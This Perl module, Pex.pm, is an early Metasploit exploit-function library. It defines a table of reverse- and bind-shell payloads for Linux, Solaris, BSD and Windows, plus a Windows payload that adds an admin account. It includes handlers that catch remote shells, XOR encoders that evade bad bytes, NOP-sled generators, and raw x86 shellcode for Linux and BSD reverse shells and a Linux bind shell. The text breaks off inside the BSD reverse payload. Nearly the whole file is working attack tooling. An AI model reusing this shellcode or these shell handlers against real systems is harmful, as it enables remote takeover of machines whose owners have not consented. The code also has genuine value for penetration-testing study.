##
#        Title: Pex.pm
#      Purpose: Exploit function library implemented as a Perl object.
#    Copyright: Copyright (C) 2003 METASPLOIT.COM
##


package Pex;

use strict;
use warnings;
use POSIX;
use IO::Socket;
use IO::Select;

require Exporter;
require DynaLoader;

our @ISA = qw(Exporter DynaLoader);
our @EXPORT = qw( PexError );
our $VERSION = '1.0';

my $PEX_DEBUG = 0;
my $PEX_ERROR;


################################
# Logging and Caching Features #
################################

my $EnableShellCache = 1;
my $EnableShellLog   = 1;
my $ShellCacheDir    = $ENV{"HOME"} . "/.Pex";
my $ShellLogDir      = $ENV{"HOME"} . "/.Pex";

my $LastPayload;
my $LastShellHost;
my $LastShellPort;


##########################
#   Available Payloads   #
##########################

# $PAYLOADS->{"ARCH"}->{"OS"}->{"NAME"} =
#            [ 
#              METH, # actual subroutine in Pex.pm
#              NAME, # the name to show to the user
#              PRIV, # does this payload need admin privileges?
#              NOTE, # comment about what the payload does
#              SHELL,# Pex method to handle this payload
#              ARGS = { OPTION => [ REQUIRED?, DESCRIPTION ] }
#            ];


my $PAYLOADS =
{
    "x86" => 
        {
        
            "linux"     => 
                {
                    "reverse" => 
                        {   METH    =>   'sc_x86_linux_reverse',
                            NAME    =>   'linx86reverse',
                            PRIV    =>   0,
                            NOTE    =>   'Makes a connection to the host and port specified and binds a shell to the socket.',
                            SHELL   =>   'ShellListen',
                            ARGS    => {
                                            LHOST => [1, "Address to send the shell to."],
                                            LPORT => [1, "Port to send the shell to."],
                                        }
                        },
                        
                    "bind" => 
                        {   METH    =>   'sc_x86_linux_bind',
                            NAME    =>   'linx86bind',
                            PRIV    =>   0,
                            NOTE    =>   'Listens for connections on the port specified and binds a shell to the socket.', 
                            SHELL   =>   'ShellConnect',                           
                            ARGS    => {
                                            LPORT => [1, "Port to bind a shell to."],
                                        }
                        },                        
        
                },


            "solaris"   => 
                {
                    "reverse" => 
                        {   METH    =>   'sc_x86_solaris_reverse',
                            NAME    =>   'solx86reverse',
                            PRIV    =>   0,
                            NOTE    =>   'Makes a connection to the host and port specified and binds a shell to the socket.',
                            SHELL   =>   'ShellListen',
                            ARGS    => {
                                            LHOST => [1, "IP address to send the shell to."],
                                            LPORT => [1, "TCP port to send the shell to."],
                                        }
                        },
                        
                    "bind" => 
                        {   METH    =>   'sc_x86_solaris_bind',
                            NAME    =>   'solx86bind',
                            PRIV    =>   0,
                            NOTE    =>   'Listens for connections on the port specified and binds a shell to the socket.',
                            SHELL   =>   'ShellConnect',
                            ARGS    => {
                                            LPORT => [1, "TCP port to bind a shell to."],
                                        }
                        },                        
                    
                },


            "bsd"       => 
                {
                    "reverse" => 
                        {   METH    =>   'sc_x86_bsd_reverse',
                            NAME    =>   'bsdx86reverse',
                            PRIV    =>   0,
                            NOTE    =>   'Makes a connection to the host and port specified and binds a shell to the socket.',
                            SHELL   =>   'ShellListen',
                            ARGS    => {
                                            LHOST => [1, "IP address to send the shell to."],
                                            LPORT => [1, "TCP port to send the shell to."],
                                        }
                        },                                               
                },


            "win32"     =>
                {
                    "reverse"  => 
                        {   METH    =>   'sc_x86_win32_reverse',
                            NAME    =>   'winreverse',
                            PRIV    =>   0,
                            NOTE    =>   'Makes a connection to the host and port specified and binds cmd.exe to the socket.',
                            SHELL   =>   'ShellListen',
                            ARGS    => {
                                            LHOST => [1, "IP address to send the shell to."],
                                            LPORT => [1, "TCP port to send the shell to."],
                                        }
                        },                    
                    
                    "bind"     => 
                        {   METH    =>   'sc_x86_win32_bind',
                            NAME    =>   'winbind',
                            PRIV    =>   0,
                            NOTE    =>   'Listens for connections on the port specified and binds cmd.exe to the socket.',
                            SHELL   =>   'ShellConnect',
                            ARGS    => {
                                            LPORT => [1, "TCP port to send the shell to."],
                                        }
                        },                          
                                             
                    "adduser"  => 
                        {   METH    =>   'sc_x86_win32_adduser',
                            NAME    =>   'winadduser',
                            PRIV    =>   1,
                            NOTE    =>   'Creates a local admin account with the username and password of "X".',
                            ARGS    => { }
                        },                                      
                },
        }
};


########################
#   Object Interface   #
########################

sub new 
{
    my ($type, $args) = @_;
    my $object = bless {}, $type;
    $object->{PAYLOADS} = $PAYLOADS;
    
    if ($args->{"EnableShellLog"})   { $object->ShellLog   (1, $args->{"ShellLogDir"}    ) }
    if ($args->{"EnableShellCache"}) { $object->ShellCache (1, $args->{"ShellCache Dir"} ) }
        
    return $object;
}



sub Error 
{
    my $object = shift();
    if (@_) { $PEX_ERROR = shift(); }
    return $PEX_ERROR;
}

sub DebugLevel
{
    my $object = shift();
    if (@_) { $PEX_DEBUG = shift(); }
    return $PEX_DEBUG;
}

sub DebugPrint
{
    my ($object, $msg, $dbg) = @_;   
    if ($PEX_DEBUG >= $dbg)
    {
        printf("[*] PexDebug[%.2x] %s\n", $dbg, $msg);
    }
}

sub ShellCache {
    my ($object, $value, $path) = @_;
    $EnableShellCache = $value;
    
    if ($EnableShellCache)
    {
        if ($path) { $ShellCacheDir = $path }
        if (! -d $ShellCacheDir)
        {
            mkdir($ShellCacheDir, 0700) || die "Pex::ShellCache >> Could not create cache directory '$ShellCacheDir': $!";
        }
    }
}

sub ShellLog {
    my ($object, $value, $path) = @_;
    $EnableShellLog = $value;
    
    if ($EnableShellLog)
    {
        if ($path) { $ShellLogDir = $path }
        if (! -d $ShellLogDir)
        {
            mkdir($ShellLogDir, 0700) || die "Pex::ShellLog >> Could not create cache directory '$ShellLogDir': $!";
        }
    }
}

########################
#   Exploit Routines   #
########################
sub GetHead {
    my ($object, $host, $port) = @_;
    my $srv;
    
    my $sh = IO::Socket::INET->new (
                Proto => "tcp",
                PeerAddr => $host,
                PeerPort => $port,
                Type => SOCK_STREAM
    );
    
    if (! $sh)
    {
       print "[*] Error, could not connect to the remote host: $!\n";
       return(0);
    } else {
        print $sh "HEAD / HTTP/1.0\r\n\r\n";
        
        while (<$sh>)
        {
            if (m/Server: (.*)/)
            {
                $srv = $1;
                $srv =~ s/\r|\n//g;
            }
        }
        
        if (! $srv)
        {
            print "[*] Error, the server did not reply with a web server banner\n";
        }
        close ($sh);
        return $srv;
    }
}

# The main process forks off a child and then listens for
# incoming connections. The child process returns back to
# the calling routine with the pid of the parent. When a
# connection is received, the child process is killed and
# the parent takes control (to gain access to stdin/stdout)


sub ShellListen
{
    my ($object, $opts) = @_;

    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => $opts->{"LPORT"},
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 3 
    );
    
    if (! $s)
    {
        $object->Error("could not start listener: $!");
        return undef;
    }

    my $parentp = $$;
    my $exploit = fork();

    if ($exploit)
    {
        # put server into non-blocking mode
        $object->UnblockHandle($s);
        
        my $stopserver = 0;
        $SIG{"TERM"} = sub { $stopserver++ };
        $SIG{"INT"}  = sub { $stopserver++ };
        
        my $sel = IO::Select->new($s);
        
        while (! $stopserver)
        {
            my @X = $sel->can_read(0.5);
            if (scalar(@X))
            {
                $stopserver++;
                
                my $victim = $s->accept();
                kill("TERM", $exploit);
        
                print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
        
                $LastShellHost = $victim->peerhost();
                $LastShellPort = $victim->peerport();
                $object->StartShell($victim);           
            }
            # work around a massive array of win32 signaling bugs
            if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
        }
        
        # make sure the exploit child process is dead
        if (kill(0, $exploit)) { kill("TERM", $exploit) }
        
        # return back to the calling module
        print STDERR "[*] Exiting Shell Listener...\n";
        return(0);
    }
    
    $SIG{"TERM"} = sub { exit(0) };
    
    return ($parentp);
}

# This is the same as ShellListen, except the parent
# process makes repeated connection atempts to the target
# port. 

sub ShellConnect
{
    my ($object, $opts) = @_;

    my $parentp = $$;
    my $exploit = fork();
           
    if ($exploit)
    {
        my $stopconnect = 0;
        my $victim;
        
        $SIG{"TERM"} = sub { $stopconnect++ };
        $SIG{"INT"}  = sub { $stopconnect++ };
        
        while ($stopconnect == 0)
        {
            $victim = IO::Socket::INET->new (
                        Proto => "tcp",
                        PeerAddr => $opts->{"RHOST"},
                        PeerPort => $opts->{"LPORT"},
                        Type => SOCK_STREAM,
                        Blocking => 0
            );
        
           if ($victim)
           {
                for (1 .. 4)
                {
                    if ($stopconnect == 0 && $victim->connected())
                    {
                        $stopconnect++;
                        kill("TERM", $exploit);
                        
                        print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
                        
                        $LastShellHost = $victim->peerhost();
                        $LastShellPort = $victim->peerport();                        
                        $object->StartShell($victim);
                    } else {
                        select(undef, undef, undef, 0.5);
                    }
                }
            } else {
                select(undef, undef, undef, 1);
            }
            # work around a massive array of win32 signaling bugs
            if (waitpid($exploit, WNOHANG) != 0) { $stopconnect++ }
        }
        
        # make sure the exploit child process is dead
        if (kill(0, $exploit)) { kill("TERM", $exploit) }
        
        # return back to the calling module
        print STDERR "[*] Exiting Shell Connector...\n";
        return(0);       
    }
    
    $SIG{"TERM"} = sub { exit(0) };
    
    return ($parentp);
}

sub StartShell 
{
    my ($object, $client) = @_;
    my $interrupt = 0;
    
    local *X;

    $SIG{"PIPE"} = 'IGNORE';
    $SIG{"INT"}  = sub { $interrupt++ };

    # command shell session logging  
    my $sloc = $client->sockhost() . "_" . $client->sockport();
    my $srem = $client->peerhost() . "_" . $client->peerport();
    
    my $ShellLogFile;
    if ($EnableShellLog)
    {
        if (! -d $ShellLogDir) { mkdir($ShellLogDir, 0700) }
        $ShellLogFile = $ShellLogDir . "/Session-" . $sloc . "-" . $srem . "-$$.log";
    } else {
        if ($^O ne "MSWin32")
        {
            $ShellLogFile = "/dev/null";
        } else {
            $ShellLogFile = "nul";
        }
    }
    
    open(X, ">>$ShellLogFile");
    
	select(X); $|++;
    select(STDOUT); $|++;

    print X "**\n";
    print X "*\n";
    print X "*    Time: " . scalar(localtime()) . "\n";
    print X "*   Local: $sloc\n";
    print X "*  Remote: $srem\n";
    print X "* Command: $0\n";
    print X "*\n";
    print X "**\n\n\n";

    
    my $con;
    my $stdpipe = 0;
    
    if($^O eq "MSWin32")
    {
        # no such thing as nonblock/select on non-sockets under win32 :(
	    socketpair($con, my $wri, AF_UNIX, SOCK_STREAM, PF_UNSPEC) || die "socketpair: $!";
	    shutdown($con, 1);
	    shutdown($wri, 0);

	    $stdpipe = fork();
	    if (! $stdpipe)
	    {
            my $input;
            $SIG{"TERM"} = sub { exit(0) };
            while(sysread(STDIN, $input, 1)){ syswrite($wri, $input, length($input)); }
            exit(0);
	    }
    } else {
        $con = *STDIN;
    }
    
    my $sel = IO::Select->new();
	
    $sel->add($con);
    $sel->add($client);

    while (fileno($client) && $interrupt == 0)
    {
        my $fd;
        my @fds = $sel->can_read(0.5);
        foreach $fd (@fds)
        {
		 	my $rdata;
            my $bytes = sysread($fd, $rdata, 2048);

            if(! defined($bytes) || $bytes == 0)
            {
                close($client);
                close(X);
				$interrupt++;
            } else {
                
                # write session data to log file
                print X $rdata;
                
                # pass data between socket and console
                if ($fd eq $client)
                {
                    print STDOUT $rdata;
                } else {
                    print $client $rdata;
                }
            }
        }
    }
    
    # shutdown sockets
    print STDERR "[*] Connection closed\n";
    close ($client);
    close (X);
    
    # shutdown console reader for win32
    if ($stdpipe) 
    { 
        kill("KILL", $stdpipe);
        while (waitpid($stdpipe, WNOHANG) == 0)
        {
            print STDERR "[*] Shutting down console monitor\n";
            kill("KILL", $stdpipe);
            select(undef, undef, undef, 0.5);
        }
    }

    # return back to module
    return(1);
}

sub UnblockHandle {
    my ($object, $fd) = @_;
    
    $fd->blocking(0);
    $fd->autoflush(1);
    
    if ($^O ne "MSWin32")
    {
        my $flags = fcntl($fd, F_GETFL,0);
        fcntl($fd, F_SETFL, $flags|O_NONBLOCK);
    }
}

#########################
#   Utility Functions   #
#########################

sub ShellCacheHasher {
    my ($object, $value, $seed) = @_;
    my ($cnt, $result);
    
    if (! $seed) { $seed = 0 }
    
    foreach (split(//, $value)) { $cnt += ord($_) }
    
    $result = sprintf("%x", $cnt + $seed);
    $seed = $cnt;
    
    return($result, $seed);
}

sub ShellCacheKey {
    my ($object, $sc, $badbytes) = @_;
    my ($cache_key, $hash, $seed);
    my @bytes;
    
    if (! $EnableShellCache ) { return undef }
    
    ($hash, $seed) =  $object->ShellCacheHasher($sc, length($sc));
    $cache_key = "sc-" . $hash;

    foreach (sort(split(//, $badbytes))) { push @bytes, sprintf("%.2x", ord($_)) }
    $cache_key .= "-" . join("_", @bytes) . ".cache";

    $object->DebugPrint("[Cache Key] $cache_key", 3);
    return($cache_key);
}

sub ShellCacheGet {
    my ($object, $cache_key) = @_;
    my %cache_bytes;
    my $res;  
          
    local *D;
    local *X;
    
    if (! $EnableShellCache ) { return undef }
    
    return undef if $cache_key !~ m/^sc\-(.*)\-(.*)\.cache/;
    
    my ($cache_hash, $cache_bytes_raw) = ($1, $2);
    foreach (split(/\_/, $cache_bytes_raw)){ $cache_bytes{$_}++ }

    
    if (! -d $ShellCacheDir)
    {
        mkdir($ShellCacheDir, 0700) || die "Pex::ShellCacheGet >> Could not create cache directory: $!";
    }
    
    opendir(D, $ShellCacheDir) || die "Pex::ShellCacheGet >> Could not access cache directory: $!";
    while (defined(my $fn = readdir(D)))
    {
        next if $fn !~ m/^sc\-$cache_hash\-(.*)\.cache/;
        
        my %test_bytes = %cache_bytes;
        
        # match these by deleting from the test set
        foreach (split(/\_/, $1)) { delete($test_bytes{$_}) }
        next if scalar(keys(%test_bytes)) != 0;
        
        $object->DebugPrint("[Cache Match] $fn", 3);
        
        # read the cached payload
        open    (X, "<$ShellCacheDir/$fn");
        binmode (X);
        while  (<X>) { $res .= $_ }
        close   (X);
        
        return($res); 
    }
    
    return undef;
}

sub ShellCacheStore {
    my ($object, $cache_key, $cache_dat) = @_;
    local *X;
    
    if (! $EnableShellCache ) { return $cache_dat }
    if (! -d $ShellCacheDir)
    {
        mkdir($ShellCacheDir, 0700) || die "Pex::ShellCacheStore >> Could not create cache directory: $!";
    }   
    open    (X, ">$ShellCacheDir/$cache_key");
    binmode (X);
    print    X $cache_dat;
    close   (X);
    return ($cache_dat);
}


sub HasBadChars {
    my ($object, $bad, $buffer) = @_;

    foreach my $c (split(//, $bad))
    { if (index($buffer, $c, 0) != -1) { return 1; } }
    return 0;
}

sub CreatePerlBuffer {
    my ($object, $buffer, $width) = @_;
    my ($res, $count);

    if (! $buffer) { return }
        
    if (! $width) { $width = 16 }
    $res = 'my $buffer = "';
    
    $count = 0;
    foreach my $char (split(//, $buffer))
    {
        if ($count == $width)
        {
            $res .= '".' . "\n" . '"';
            $count = 0;
        }
        $res .= sprintf("\\x%.2x", ord($char));
        $count++;
    }
    if ($count) { $res .= '";' . "\n"; }
    return $res;
}


sub PatternCreate
{
    my ($object, $length) = @_;
    my ($X, $Y, $Z);
    my $res;
    
    while (1)
    {
        for my $X ("A" .. "Z") { for my $Y ("a" .. "z") { for my $Z (0 .. 9) { 
           $res .= $X;
           return $res if length($res) >= $length;

           $res .= $Y;
           return $res if length($res) >= $length; 
           
           $res .= $Z;
           return $res if length($res) >= $length;             
        }}}
    }
}

sub PatternOffset 
{
       my ($object, $pattern, $address) = @_; 
       my @results;
       my ($idx, $lst) = (0,0);
       
       $address = pack("L", eval($address));
       $idx = index($pattern, $address, $lst);

       while ($idx > 0)
       {
            push @results, $idx;
            $lst = $idx + 1;
            $idx = index($pattern, $address, $lst);
       }
       return @results;
}


############################
#   Shellcode Generation   #
############################

sub SC {
    my ($object, $arch, $os, $name, $args) = @_;
    my ($data, $meth, $res);

    if  (
          $PAYLOADS->{$arch} &&
          $PAYLOADS->{$arch}->{$os} &&
          ($data = $PAYLOADS->{$arch}->{$os}->{$name})
        )
        {   
            $meth = $LastPayload = $data->{"METH"};
            $res = $object->$meth($args);
            return ($res);           
        } else {
            $object->Error("invalid shellcode"); 
            return undef
        }
}

sub EasySC {
    my ($object, $badbytes, $len, $arch, $os, $name, $args) = @_;
    my $sc = $object->SC($arch, $os, $name, $args);
    my $searching = 1;
    my ($xor, $xor_bin, $res, $min);

    if (! length($badbytes)) { $badbytes = "\x00"; }
    
    if (! $sc)
    {
        $object->Error("could not create shellcode: " . $object->Error());
        return;
    }

    $min = (length($sc) + length($object->LongXorDecoder($arch, 1, 1)));
    
    if ($len < $min)
    {
        $object->Error("length value is too small for shellcode (minimum: $min)");
        return;
    }

    # try to find a cached copy
    my $cache_key = $object->ShellCacheKey($sc, $badbytes);
    my $cache_dat = $object->ShellCacheGet($cache_key);
    
    if (! $cache_dat)
    {
        my $count = 0;
        while ($searching)
        {

            # work around a very stupid rand() bug in ActiveState perl
            $xor_bin = pack("S", rand() * 0xffff) . pack("S", rand() * 0xffff);
            $xor     = unpack("L", $xor_bin);

            $count++;
            if ($object->HasBadChars
                        (
                         $badbytes,
                         $object->LongXor($xor, $sc) .
                         $object->LongXorDecoder($arch, $xor, length($sc))
                        ) == 0             
               )
            {
                $res  = $object->LongXorDecoder($arch, $xor, length($sc));
                $res .= $object->LongXor($xor, $sc);
                $searching--;
                next;
            }
        }
        
        $cache_dat = $object->ShellCacheStore($cache_key, $res);
    }
    
    $res = $object->Nops($arch, ($len - length($cache_dat)), 0) . $cache_dat;
    
    return $res;
}

# still under devlopment, will eventually replace EasySC
sub SuperSC 
{
    my ($object, $badbytes, $len, $arch, $os, $name, $args) = @_;
    my $sc = $object->SC($arch, $os, $name, $args);
    my $searching = 1;
    my ($xor, $res, $min);

    if (! $sc)
    {
        $object->Error("could not create shellcode: " . $object->Error());
        return;
    }

    # look for a cached copy of the shellcode
    my $cache_key = $object->ShellCacheKey($sc, $badbytes);
    my $cache_dat = $object->ShellCacheGet($cache_key);
    
    # return a cached copy if we find one
    if ($cache_dat) { return $object->Nops($arch, ($len - length($cache_dat)), 0) . $cache_dat }
    
    # if no bytes are restricted, just return the shellcode without an encoder
    if (! length($badbytes))
    {
        $cache_dat = $object->ShellCacheStore($cache_key, $sc);
        return $object->Nops($arch, ($len - length($cache_dat)), 0) . $cache_dat;
    }
    
    my %bl_bad = ();
    my %bl_sok = ();
    
    # Step 1: Generated a hash of bad byte values for easy comparisons
    foreach (split(//, $badbytes)) { $bl_bad{$_}++ }
    
    # Step 2: Create another hash of allowed values, speeds up checks
    for (0 .. 255) { if (! exists($bl_bad{chr($_)})){ $bl_sok{chr($_)}++ } }
    
    # Step 3: Find an encoder that works with the length and bad bytes
    
    ####
    { ## Single Byte XOR (byte xor key, word len)
    ####
    
        # Generate a sample decoder sequence, use a known good character and a test length
        my ($test_key) = keys(%bl_sok);
        my $test_xor = $object->XorDecoderFPU($arch, ord($test_key), 0xBEEF);

        # Remove the length word value, we can pad this with nops
        my $clean_len = pack("S", 0xBEEF);
        $test_xor =~ s/$clean_len//g;
        
        # Does the actual decoder contain any of the bad characters?
        if ($object->HasBadChars($badbytes, $test_xor) == 0)
        {
            my $max_pad = $len - length($sc) - length($test_xor) - length($clean_len);
            my $cur_pad = 0;
            my $mat_pad = 0;
            
            # Start at 257 if the payload is less than 256 bytes and we need to avoid nulls
            if (length($sc) < 256 && exists($bl_bad{"\x00"})) { $cur_pad = (257 - length($sc)) }
            
            while ($cur_pad < $max_pad && $mat_pad == 0)
            {
                my $test_len = pack("S", length($sc) + $cur_pad);
                if ($object->HasBadChars($badbytes, $test_len) == 0)
                { $mat_pad++ } else { $cur_pad++ }
            }
            
            if ($mat_pad)
            {
                my $payload = $sc . $object->Nops($arch, $cur_pad, 0);
                foreach my $xb (keys(%bl_sok))
                {
                    my $final = $object->XorDecoderFPU($arch, ord($xb), length($payload)) . 
                                $object->Xor(ord($xb), $payload);
                                
                    if ($object->HasBadChars($badbytes, $final) == 0)
                    {
                        $cache_dat = $object->ShellCacheStore($cache_key, $final);
                        return $object->Nops($arch, ($len - length($cache_dat)), 0) . $cache_dat;                   
                    }
                }
            }
            
        } ##### 
    } ######### End Single Byte XOR


    ####
    { ## Word XOR (word xor key, word len)
    ####
    
        # Generate a sample decoder sequence, use a known good character and a test length
        my $test_xor = $object->ShortXorDecoder($arch, 0xDEAD, 0xBEEF);

        # Remove the length word value, we can pad this with nops
        my $clean_len = pack("S", 0xBEEF);
        $test_xor =~ s/$clean_len//g;
        
        $clean_len = pack("S", 0xDEAD);
        $test_xor =~ s/$clean_len//g;
        
        # Does the actual decoder contain any of the bad characters?
        if ($object->HasBadChars($badbytes, $test_xor) == 0)
        {

            my $max_pad = $len - length($sc) - length($test_xor) - (length($clean_len) * 2);
            my $cur_pad = 0;
            my $mat_pad = 0;
            
            # Start at 257 if the payload is less than 256 bytes and we need to avoid nulls
            if (length($sc) < 256 && exists($bl_bad{"\x00"})) { $cur_pad = (257 - length($sc)) }
            
            while ($cur_pad < $max_pad && $mat_pad == 0)
            {
                my $test_len = pack("S", 0xffff - (length($sc) + $cur_pad));
                if ($object->HasBadChars($badbytes, $test_len) == 0)
                { $mat_pad++ } else { $cur_pad++ }
            }
            
            if ($mat_pad)
            {
                my $payload = $sc . $object->Nops($arch, $cur_pad, 0);
                
                my $start_val = 1;
                if (exists($bl_bad{"\x00"})) { $start_val = 257 }
                
                for (my $y = $start_val; $y <= 65536; $y++)
                {

                    if ($object->HasBadChars($badbytes, pack("S", 0xffff - $y)) == 0)
                    {
                        my $final = $object->ShortXorDecoder($arch, $y, length($payload)) . 
                                    $object->ShortXor($y, $payload);

                        if ($object->HasBadChars($badbytes, $final) == 0)
                        {
                            print "[*] Using $y\n";
                            $cache_dat = $object->ShellCacheStore($cache_key, $final);
                            return $object->Nops($arch, ($len - length($cache_dat)), 0) . $cache_dat;                   
                        }
                    }
                }
            }
            
        } ##### 
    } ######### End Word XOR
    

  
    return undef;
}

sub Nops {
    my ($object, $arch, $count, $poly) = @_;

    # nop definitions for various architectures
    # most of these were pulled from ADMutate
    # we only include single byte nops because
    # often we jump into the middle of the sled
    
    my @nops_x86 = split(//,"\x99\x96\x97\x95\x93\x91\x90\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97".
                            "\x46\x4e\xf8\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b".
                            "\xf5\x45\x4c");

    if (lc($arch) eq "x86")
    {
        if (! $poly){ return ("\x90" x $count); }
        return join ("", @nops_x86[ map { rand @nops_x86 } ( 1 .. $count )]);
    }

    $object->Error("unknown architecture");
    return;
}

sub Xor {
    my ($object, $xor, $buffer) = @_;
    my $res;
    
    foreach my $char (split(//, $buffer))
    {
        $res .= chr(ord($char) ^ $xor);
    }
    return $res;
}

sub LongXor {
    my ($object, $xor, $buffer) = @_;
    my $res;
    my $c;
    
    # borrowed structure from Dino Dai Zovi's encoder
    for ($c = 0; $c < length($buffer); $c += 4) 
    {
	    my $chunk = substr($buffer, $c);
        $chunk .= ("\x90" x (4 - length($chunk)));
	    $chunk  = unpack("L", $chunk) ^ $xor;
	    $res   .= pack("L", $chunk);
	}   
    return $res;
}

sub ShortXor {
    my ($object, $xor, $buffer) = @_;
    my $res;
    my $c;
    
    # borrowed structure from Dino Dai Zovi's encoder
    for ($c = 0; $c < length($buffer); $c += 2) 
    {
	    my $chunk = substr($buffer, $c);
        $chunk .= ("\x90" x (2 - length($chunk)));
	    $chunk  = unpack("S", $chunk) ^ $xor;
	    $res   .= pack("S", $chunk);
	}   
    return $res;
}


sub XorDecoder {
    my ($object, $arch, $xor, $len) = @_;
    if(! $len) { $len = 0x200 }
    
    # this xor decoder was written by hdm[at]metasploit.com
    if (lc($arch) eq "x86")
    {
        $len = pack("S", 0xffff - $len);
        
        return
        "\xd9\xe1".                     # fabs
        "\xd9\x34\x24".                 # fnstenv (%esp,1)
        "\x5b".                         # pop %ebx
        "\x5b".                         # pop %ebx
        "\x5b".                         # pop %ebx
        "\x5b".                         # pop %ebx
        "\x80\xeb\xe7".                 # sub $0xe7,%bl
        #
        # short_xor_beg:
        #
        "\x31\xc9".                     # xor %ecx,%ecx
        "\x66\x81\xe9$len".             # sub $len,%cx
        #
        # short_xor_xor:
        #
        "\x80\x33". chr($xor).          # xorb $0x69,(%ebx)
        "\x43".                         # inc %ebx
        "\xe2\xfa";                     # loop 8048093 <short_xor_xor>
       
    }
    
    $object->Error("unknown architecture");
    return;
}

sub LongXorDecoder {
    my ($object, $arch, $xor, $len) = @_;
    if(! $len) { $len = 0x200 }
    
    # this xor decoder was written by hdm[at]metasploit.com
    if (lc($arch) eq "x86")
    {
        my $div = $len / 4;
        if ($len - (int($div) * 4) > 0) { $div++ }
        
        my $xorlen = pack("L", (0xffffffff - $div));
        my $xorkey = pack("L", $xor);
        
        my $decoder =  
            "\xeb\x19".                     # jmp 804809b <xor_end>
            "\x5e".                         # pop %esi
            "\x31\xc9".                     # xor %ecx,%ecx
            "\x81\xe9". $xorlen .           # sub -xorlen,%ecx
            "\x81\x36". $xorkey .           # xorl xorkey,(%esi)
            "\x81\xee\xfc\xff\xff\xff".     # sub $0xfffffffc,%esi (add esi, 0x04)
            "\xe2\xf2".                     # loop 804808b <xor_xor>
            "\xeb\x05".                     # jmp 80480a0 <xor_don>
            "\xe8\xe2\xff\xff\xff";         # call 8048082 <xor_beg>
        return $decoder;
    }
    
    $object->Error("unknown architecture");
    return;
}


sub ShortXorDecoder {
    my ($object, $arch, $xor, $len) = @_;
    if(! $len) { $len = 0x200 }
    
    # this xor decoder was written by hdm[at]metasploit.com
    if (lc($arch) eq "x86")
    {
        my $div = $len / 2;
        if ($len - (int($div) * 2) > 0) { $div++ }
        
        my $xorlen = pack("S", (0xffff - $div));
        my $xorkey = pack("S", $xor);
        
        my $decoder =    
            "\xeb\x13".                     # jmp 8048095 <short_xor_end>
            #
            # short_xor_beg:
            #
            "\x5e".                         # pop %esi
            "\x31\xc9".                     # xor %ecx,%ecx
            "\x66\x81\xe9". $xorlen .       # sub $0xfff4,%cx
            #
            # short_xor_xor:
            #
            "\x66\x81\x36". $xorkey .        # xorw $0x1234,(%esi)
            "\x46".                         # inc %esi
            "\x46".                         # inc %esi
            "\xe2\xf7".                     # loop 804808a <short_xor_xor>
            "\xeb\x05".                     # jmp 804809a <short_xor_don>
            #
            # short_xor_end:
            #
            "\xe8\xe8\xff\xff\xff";         # call 8048082 <short_xor_beg>
        return $decoder;
    }
    
    $object->Error("unknown architecture");
    return;
}
      


################
#   Payloads   #
################

sub Payloads {
    my ($object) = @_;
    return $object->{PAYLOADS};
}


##
# Linux Payloads
##

sub sc_x86_linux_reverse
{
    my ($object, $args) = @_;

    my $port = $args->{"LPORT"};
    
    if (!$port)
    {
        $object->Error("invalid port");
        return undef; 
    }
    
    my $off_port = 26;
    my $port_bin = reverse(pack("S", $port));

    my $host = $args->{"LHOST"};
    my $off_host = 19;
    my $host_bin = gethostbyname($host);
    
    if (length($host_bin) != 4)
    {
        $object->Error("invalid host");
        return undef;
    }

    my $shellcode = # reverse connect setuid by hdm[at]metasploit.com
    "\x89\xe5\x31\xc0\x31\xdb\x43\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66".
    "\xcd\x80\x68\xc0\xa8\x00\xf7\x68\x02\x00\x22\x11\x89\xe1\x6a\x10".
    "\x51\x50\x89\xe1\x50\x31\xc0\xb0\x66\xb3\x03\xcd\x80\x85\xc0\x78".
    "\x33\x4b\x89\xd9\x31\xc0\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0".
    "\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x31\xc0\x50\x89\xe2\x68".
    "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x8d\x0c\x24".
    "\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";

    substr($shellcode, $off_port, 2, $port_bin);
    substr($shellcode, $off_host, 4, $host_bin);
    return($shellcode);
}

sub sc_x86_linux_bind {
    my ($object, $args) = @_;
    my ($port) = ($args->{"LPORT"});
    
    if (! $port)
    {
        $object->Error("invalid port");
        return undef;
    }
    
    my $off_port = 21;
    my $port_bin = reverse(pack("S", $port));
    
    my $shellcode = # linux bind shellcode by bighawk
    "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80".
    "\x89\xc7\x52\x66\x68\x27\x10\x43\x66\x53\x89\xe1\xb0\x10\x50\x51".
    "\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50\x57".
    "\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80".
    "\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3".
    "\x51\x53\x89\xe1\xb0\x0b\xcd\x80";  

    substr($shellcode, $off_port, 2, $port_bin);
    return $shellcode;
}


##
# BSD Payloads
##


sub sc_x86_bsd_reverse {
    my ($object, $args) = @_;
    my ($host, $port) = ($args->{"LHOST"}, $args->{"LPORT"});

    my $off_host = 10;
    my $off_port = 18;

    my $shellcode = # bsd reverse connect by root[at]marcetam.net
    "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\xaa\xbb\xcc\xdd\xcd\x80".
    "\x66\x68\xbb\xaa\x66\x52\x89\xe6\x6a\x10\x56\x50\x50\xb0\x62\xcd".
    "\x80\x5b\xb0\x5a\x52\x53\x52\x4a\xcd\x80\x7d\xf6\x68\x6e\x2f\x73".
    "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80";

    my $host_bin = gethostbyname($host);
    my $port_bin = reverse(pack("S", $port));
    
    if (length($host_bin) != 4)
    {
        $object->Error("invalid host");
        return undef;
    }
    
    substr($shellcode, $off_host, 4, $host_bin);
    substr($shellcode, $off_port, 2, $port_bin);
